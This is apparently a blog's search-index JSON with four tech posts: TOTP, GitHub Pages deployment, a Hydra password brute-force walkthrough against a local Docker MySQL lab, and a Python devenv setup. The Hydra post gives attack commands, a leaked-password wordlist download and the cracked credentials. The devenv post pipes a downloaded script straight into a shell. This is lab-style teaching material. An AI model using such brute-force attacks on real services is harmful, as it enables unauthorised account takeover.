{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Blog","text":"<p>This is a modern technical blog built with MkDocs Material theme. Here you'll find articles about programming, technology, and software development.</p>"},{"location":"about/","title":"About Me","text":"<p>I'm a software developer passionate about technology and sharing knowledge. This blog is where I share my thoughts, experiences, and tutorials about various tech topics.</p>"},{"location":"2024/01/16/totp/","title":"TOTP","text":"<p>The Time-based One-Time-Password technique is used in multifactor authentication to generate one-time passwords (OTPs). Setting up an authenticator app (such as Google Authenticator) is a requirement for MFA enrollment. A QR code is given to us, which we must scan using an app. The OTP list, which is updated every 30 seconds, will then contain a new entry. In the beginning, it appeared to me that an integration had been set up between an app on my phone and a Google server that served as the token generation server during enrollment. In actuality, a connection to Google or any other server is not necessary. The application obtains all the data when the QR code is scanned in order to produce fresh OTPs every 30 seconds. A QR code comprises:</p> <p><code>otpauth://TYPE/LABEL?PARAMETERS</code></p> <p>e.g.</p> <p><code>otpauth://totp/NAME:ACCOUNT@google.com?secret=SECRET&amp;issuer=ISSUER</code></p>"},{"location":"2024/01/16/totp/#hmac","title":"HMAC","text":"<p>The most crucial component, which is utilized in the computation of each OTP, is secret. We obtain the cryptographic hash (HMAC algorithm), which is the OTP we use for authentication, using this secret and a counter that is based on time intervals of thirty seconds.</p> <p>The entire token validation process is synchronized at the algorithmic level, and each party is able to independently calculate those values.</p>"},{"location":"2024/01/16/totp/#small-experiment","title":"Small experiment","text":"<p>There is an python libary pyotp we can use to generate secret and generate OTPs.</p> <pre><code>pip3 install pyotp\n</code></pre> <pre><code>import pyotp\n\n# Generate secret -&gt; use it in authenticator app e.g. Google Authenticator\n\nsecret = pyotp.random_base32()\n\n# Create TOTP generator based on secret\n\ntotp = pyotp.TOTP(secret)\n\n# Generate OTP using TOTP generator\n\n# It changes each 30 seconds\n\n# You can compare it with value from authenticator app\n\ntotp.now()\n\n# Verify token\n\ntotp.verify(\"PUT VALUE FROM APP\")\n</code></pre> <p>Above code generates same OTPs as Google Authenticator and we can also validate OTP taken from app.</p>"},{"location":"2024/04/01/react-app-on-github-pages/","title":"React app on Github Pages","text":"<p>This is simple instruction how to deploy your React app on Github Pages</p>"},{"location":"2024/04/01/react-app-on-github-pages/#install-dependecies","title":"Install dependecies","text":"<pre><code># Install gh-pages\nnpm install --save gh-pages\n</code></pre>"},{"location":"2024/04/01/react-app-on-github-pages/#add-info-about-your-domain-in-packagejson","title":"Add info about your domain in package.json","text":"<pre><code>{\n  \"name\": \"some-repo\",\n  \"version\": \"0.1.0\",\n  \"homepage\": \"https://&lt;GITHUB_NICK&gt;.github.io/some-repo\",\n  ...\n}\n</code></pre>"},{"location":"2024/04/01/react-app-on-github-pages/#generate-publicprivate-key","title":"Generate public/private key","text":"<pre><code>ssh-keygen -t rsa -b 2048\n</code></pre>"},{"location":"2024/04/01/react-app-on-github-pages/#add-deploy-key","title":"Add deploy key","text":"<p>Create in Github repo deploy key using generated public key</p> <p></p>"},{"location":"2024/04/01/react-app-on-github-pages/#add-secret","title":"Add secret","text":"<p>Create in Github repo secret using generated private key</p> <p></p>"},{"location":"2024/04/01/react-app-on-github-pages/#add-github-action","title":"Add Github action","text":"<p>Create <code>.github/workflows/deploy.yml</code> file with deployment definition</p> <pre><code>name: Deploy React Application\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\njobs:\n  build_test:\n    runs-on: ubuntu-latest\n\n    strategy:\n      matrix:\n        node-version: [18.13.0]\n    steps:\n      - uses: actions/checkout@v2\n      - name: Use Node.js ${{ matrix.node-version }}\n        uses: actions/setup-node@v2\n        with:\n          node-version: ${{ matrix.node-version }}\n      - name: npm ci, build and test\n        working-directory: ./your-project\n        run: |\n          npm ci\n          npm install\n          npm run build --if-present\n      - name: deploy to gh-pages\n        uses: peaceiris/actions-gh-pages@v3\n        with:\n          deploy_key: ${{ secrets.YOUR_DEPLOY_KEY }}\n          publish_dir: ./your-project/build\n</code></pre>"},{"location":"2024/04/01/react-app-on-github-pages/#create-gh-pages-branch","title":"Create <code>gh-pages</code> branch","text":"<p>Run <code>git checkout -b gh-pages</code> to create new branch dedicated for deployment/build files</p>"},{"location":"2024/04/01/react-app-on-github-pages/#setup-github-pages","title":"Setup Github Pages","text":"<p>Set <code>gh-pages</code> branch as a root</p> <p></p>"},{"location":"2024/04/01/react-app-on-github-pages/#push-changes","title":"Push changes","text":"<p>Push changes to trigger deployment</p> <pre><code>git add .\ngit commit -m 'Add gh-pages deployment'\ngit push\n</code></pre>"},{"location":"2024/04/01/react-app-on-github-pages/#chack-deployment","title":"Chack deployment","text":"<p>Open <code>https://&lt;GITHUB_NICK&gt;.github.io/some-repo</code></p>"},{"location":"2024/07/17/hydra-walkthrough/","title":"Hydra Walkthrough","text":"<p>Hydra is a powerful network logon cracker that supports numerous protocols, enabling security professionals to test the strength of passwords by performing brute-force attacks. It is widely used for network security testing, helping to identify weak passwords on various services such as FTP, HTTP, SMTP, and more.</p>"},{"location":"2024/07/17/hydra-walkthrough/#installation","title":"Installation","text":"<pre><code># Linux\napt-get install hydra\n\n# MacOS\nbrew install hydra\n</code></pre> <p>Validate installation by running:</p> <pre><code>hydra -h\n</code></pre>"},{"location":"2024/07/17/hydra-walkthrough/#prepare-attack-target-mysql-database","title":"Prepare attack target - MySQL database","text":""},{"location":"2024/07/17/hydra-walkthrough/#create-initsql","title":"Create <code>init.sql</code>","text":"<pre><code>-- Create additional users\nCREATE USER 'user1'@'%' IDENTIFIED BY 'password12345';\n\n-- Grant privileges\nGRANT ALL PRIVILEGES ON db.* TO 'user1'@'%';\n\nGRANT SELECT ON mysql.user TO 'user'@'%';\n\n\n-- Flush privileges to ensure that all changes take effect\nFLUSH PRIVILEGES;\n</code></pre>"},{"location":"2024/07/17/hydra-walkthrough/#create-docker-composeyml","title":"Create <code>docker-compose.yml</code>","text":"<pre><code>version: \"3.8\"\n\nservices:\n  db:\n    image: mysql:latest\n    container_name: mysql_db\n    environment:\n      MYSQL_ROOT_PASSWORD: rootpassword\n      MYSQL_DATABASE: db\n      MYSQL_USER: user\n      MYSQL_PASSWORD: password\n    volumes:\n      - db_data:/var/lib/mysql\n      - ./init.sql:/docker-entrypoint-initdb.d/init.sql\n    ports:\n      - \"3306:3306\"\n\nvolumes:\n  db_data:\n</code></pre> <p>Run MySQL database in Docker container:</p> <pre><code>docker-compose up -d\n</code></pre> <p>Install MySQL client:</p> <pre><code># Linux\napt-get install mysql-client\n\n# MacOS\nbrew install mysql-client\n</code></pre> <p>Connect to MySQL database:</p> <pre><code>\u2570\u2500 sudo mysql -h 127.0.0.1 -P 3306 -u user -p\n\nEnter password:\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 8\nServer version: 8.3.0 MySQL Community Server - GPL\n\nCopyright (c) 2000, 2024, Oracle and/or its affiliates.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql&gt;\n</code></pre> <p>List all user</p> <pre><code>SELECT User, Host FROM mysql.user;\n</code></pre> <p>You should see</p> <pre><code>+------------------+-----------+\n| User             | Host      |\n+------------------+-----------+\n| root             | %         |\n| user             | %         |\n| user1            | %         |\n| user2            | %         |\n| mysql.infoschema | localhost |\n| mysql.session    | localhost |\n| mysql.sys        | localhost |\n| root             | localhost |\n+------------------+-----------+\n8 rows in set (0.01 sec)\n</code></pre>"},{"location":"2024/07/17/hydra-walkthrough/#prepare-attack-data","title":"Prepare attack data","text":"<p>Check usernames.txt file:</p> <pre><code>user\nuser1\nuser2\n</code></pre> <p>Download rockyou.txt dictionary:</p> <pre><code>#bin/sh\n\n# Download rockyou.txt dictionary\nwget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz\n\n# Extract rockyou.txt dictionary\ntar -xvf rockyou.txt.tar.gz\n\n# Rename rockyou.txt to passwords.txt\nmv rockyou.txt passwords.txt\n\n# Remove rockyou.txt.tar.gz\nrm rockyou.txt.tar.gz\n</code></pre> <pre><code># Download\n./download_rockyou.txt\n</code></pre>"},{"location":"2024/07/17/hydra-walkthrough/#attack-mysql-database","title":"Attack MySQL database","text":"<pre><code>hydra -L usernames.txt -P passwords.txt -s 3306 localhost mysql\n</code></pre> <pre><code>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-13 12:01:24\n[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 4 tasks per 1 server, overall 4 tasks, 28688796 login tries (l:2/p:14344398), ~7172199 tries per task\n[DATA] attacking mysql://localhost:3306/\n</code></pre>"},{"location":"2024/07/17/hydra-walkthrough/#password","title":"password","text":"<pre><code>[3306][mysql] host: localhost   login: user   password: password\n</code></pre>"},{"location":"2024/07/17/hydra-walkthrough/#password1234","title":"password1234","text":"<pre><code>[3306][mysql] host: localhost   login: user1   password: password12345\n[STATUS] attack finished for localhost (waiting for children to complete tests)\n1 of 1 target successfully completed, 2 valid passwords found\n</code></pre>"},{"location":"2024/11/25/simple-development-environment-for-python/","title":"Simple Development Environment","text":"<p>Python is a versatile programming language that is widely used in various fields such as web development, data science, machine learning, and more. Setting up a development environment for Python is essential to ensure smooth coding and testing of your projects. In this guide, we will walk through the steps to set up a Python development environment on your local machine using <code>nix</code> package manager and its wrapper <code>devenv</code>tool.</p>"},{"location":"2024/11/25/simple-development-environment-for-python/#nix-package-manager","title":"Nix Package Manager","text":"<p>Nix is a powerful package manager for Linux and other Unix systems that provides a functional, reliable, and reproducible package management system. It allows you to install, upgrade, and remove software packages in a declarative and atomic way. Nix ensures that your development environment is isolated, reproducible, and consistent across different machines.</p>"},{"location":"2024/11/25/simple-development-environment-for-python/#devenv-tool","title":"DevEnv Tool","text":"<p>DevEnv is a wrapper tool for Nix that simplifies the process of setting up development environments for various programming languages and frameworks. It provides a user-friendly interface to manage your development environments, including creating scripts, tasks and services.</p>"},{"location":"2024/11/25/simple-development-environment-for-python/#setting-up-python-development-environment","title":"Setting Up Python Development Environment","text":""},{"location":"2024/11/25/simple-development-environment-for-python/#1-install-devenv","title":"1. Install devenv","text":"<p>First, you need to install the <code>devenv</code> tool by running the following command:</p> <pre><code>curl -L https://devenv.sh | sh\n</code></pre>"},{"location":"2024/11/25/simple-development-environment-for-python/#2-init-devenv","title":"2. Init devenv","text":"<p>Initialize the <code>devenv</code> tool by running the following command:</p> <pre><code>devenv init\n</code></pre> <p>It will create:</p> <ul> <li><code>devenv</code> - directory in your home directory</li> <li><code>devenv.nix</code> - file containing defintion of your development environment</li> <li><code>devenv.yaml</code> - file containing imported packages</li> </ul>"},{"location":"2024/11/25/simple-development-environment-for-python/#3-update-devenvnix","title":"3. Update devenv.nix","text":"<p>Edit <code>devenv.nix</code> file to define your development environment. For example, to set up a Python development environment, you can add the following lines:</p> <pre><code> { pkgs, lib, config, inputs, ... }:\n {\n   packages = [\n   ];\n\n   languages.python = {\n   enable = true;\n   version = \"3.12\";\n   venv.enable = true;\n   venv.requirements = ./requirements.txt;\n   };\n\n   enterShell = ''\n   jupyter lab\n   '';\n}\n</code></pre> <p>Example <code>requirements.txt</code> file:</p> <pre><code>numpy==2.1.3\npandas==2.2.3\njupyterlab==4.3.0\nscikit-learn==1.5.2\nmatplotlib==3.9.2\nseaborn==0.13.2\npandas==2.2.3\n</code></pre>"},{"location":"2024/11/25/simple-development-environment-for-python/#4-enter-development-environment","title":"4. Enter Development Environment","text":"<p>To enter the Python development environment, run the following command:</p> <pre><code>devenv shell\n</code></pre> <p>This will activate the Python environment and you can start coding and testing your projects.</p>"},{"location":"archive/2024/","title":"2024","text":""}]}